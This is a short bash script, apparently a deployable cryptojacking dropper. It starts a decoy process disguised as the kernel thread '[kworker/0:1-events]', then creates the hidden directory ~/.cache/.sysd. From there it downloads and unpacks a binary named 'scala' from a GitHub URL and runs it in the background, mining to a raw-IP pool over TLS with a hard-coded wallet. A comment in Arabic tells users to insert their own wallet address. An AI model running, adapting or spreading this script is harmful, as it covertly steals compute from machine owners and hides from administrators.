#!/bin/bash

nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &

WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="dandi"
POOL="45.155.102.89:443"
THREADS=

WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
